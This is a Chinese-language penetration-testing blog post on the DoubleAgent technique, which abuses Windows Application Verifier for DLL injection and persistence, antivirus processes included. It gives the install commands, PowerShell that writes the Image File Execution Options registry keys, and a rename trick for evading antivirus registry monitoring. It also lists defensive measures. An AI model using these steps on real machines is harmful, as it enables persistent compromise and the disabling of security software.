---
layout: post
title: 渗透测试中的Application Verifier(DoubleAgent利用介绍)
---

## 0x00 前言
---

近日，Cybellum Technologies LTD公开了一个0-day漏洞的POC，对其命名为“DoubleAgent”,可用于控制主流的杀毒软件

不同于以往的绕过思路，这次使用的是一种直接攻击并劫持的方式

本文将要介绍该方式的原理，分享利用思路、攻击条件和防御方法

Cybellum的博客链接如下：

https://cybellum.com/doubleagent-taking-full-control-antivirus/

https://cybellum.com/doubleagentzero-day-code-injection-and-persistence-technique/

**POC：**

https://github.com/Cybellum/DoubleAgent

## 0x01 简介
---

该方式主要是对微软系统自带的Application Verifier（应用程序检验器）进行利用

**利用过程如下：**

- 编写自定义Verifier provider DLL
- 通过Application Verifier进行安装
- 注入到目标进程执行payload
- 每当目标进程启动，均会执行payload，相当于一个自启动的方式

**Application Verifier支持系统：**

`WinXP-Win10`

理论上，该利用方式支持WinXP-Win10，但是POC提供的dll在部分操作系统下会报错，修复方法暂略，本文仅挑选一个默认成功的系统进行测试——Win8.1 x86

## 0x02 application verifier
---

是针对非托管代码的运行时验证工具，它有助于找到细小的编程错误、安全问题和受限的用户帐户特权问题，使用常规的应用程序测试技术很难识别出这些错误和问题

**注：**

类似于Application Compatibility Shims，可以理解为一种补丁机制

关于Application Compatibility Shims在渗透测试中的利用技巧可参照：

https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/


更多基础概念可参考微软官方文档，地址如下：

https://msdn.microsoft.com/zh-cn/library/aa480483.aspx


**测试系统：**

Win8.1 x86(默认支持application verifier)


cmd输入(管理员权限)：

`appverif `

进入控制界面，通过面板查看配置验证器

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-1.png)


添加一个测试程序，可对其检测和调试内存损坏、危险的安全漏洞以及受限的用户帐户特权问题

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-2.png)

通过命令行也能够实现相同的操作

命令行添加：

`appverif /verify notepad.exe`

命令行删除：

`appverif /n notepad.exe`

**注：**

对于运行中的进程，不能安装application verifier



## 0x03 实际测试
---

**POC编译环境搭建：**

- 安装VS2017
- 安装Windows SDK for Windows 8.1


**测试系统：**

Win8.1 x86

POC添加shellcode：

`MessageBox(NULL, NULL, NULL, 0);`

部分代码如下：

```
static BOOL main_DllMainProcessAttach(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	MessageBox(NULL, NULL, NULL, 0);
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);
	return FALSE != DOUBLEAGENT_SUCCESS(eStatus);
}
```

编译后将DoubleAgent_x86.exe和\x86\DoubleAgentDll.dll放于同级目录下

cmd下：
(管理员权限)

安装：

`DoubleAgent_x86.exe install notepad.exe`

卸载：

`DoubleAgent_x86.exe uninstall notepad.exe`

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-3.png)

安装后，启动notepad.exe，弹框，之后正常启动notepad.exe


安装成功后，在面板中也可以看到安装的verifier

cmd输入appverif

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-4.png)

如果想要劫持非系统默认安装的程序，那么该程序需要存放于system32文件夹下(或者新建快捷方式存放于system32并指向原程序)


需要先将DoubleAgentDll.dll复制到system32下，再通过命令行安装



安装成功后，在注册表会保存安装信息：

注册表位置：

`[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]`

键值信息如下：

```
"GlobalFlag"="0x100"
"VerifierDlls"="DoubleAgentDll.dll"
```

如果删除该注册表键值，那么verifier失效

**注：**

查看poc源码发现安装操作是通过新建注册表键值的方法


所以下面尝试通过脚本新建注册表键值来实现verifier的安装：

**1、powershell测试代码实现注册表键值的添加**

```
New-Item -itemType DWord "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
New-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -name GlobalFlag -propertytype Dword -value 0x100
New-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -name VerifierDlls -propertytype String -value DoubleAgentDll.dll
```

**2、将测试dll复制到system32下**

`copy DoubleAgentDll.dll c:\windows\system32\DoubleAgentDll.dll`


**3、再次启动notepad.exe，弹框**

代表verifier被安装

**4、删除verifier的powershell代码：**

`Del "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -recurse`


**注：**

部分杀毒软件会对注册表`HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`进行监控

**绕过方法：**

新建一个任意名称的注册表键值，再重命名为目标程序

## 0x04 分析
---

**利用方式：**

- dll注入
- 自启动

主要用于后渗透阶段

**特别的地方：**

绕过杀毒软件的拦截，并能够对杀毒软件本身进行注入，使杀毒软件本身失效或者对其利用

**攻击条件：**

获得管理员权限

**POC——>EXP:**

参照其中DoubleAgentDll工程生成dll，通过powershell或其他脚本实现安装利用

**防御方法：**

- 监控注册表键值HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
- 控制管理员权限
- 查看system32下有无可疑dll和快捷方式

## 0x05 小结
---

本文对“DoubleAgent”的原理、利用思路、攻击条件和防御方法作了简要介绍，希望能够帮助大家

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

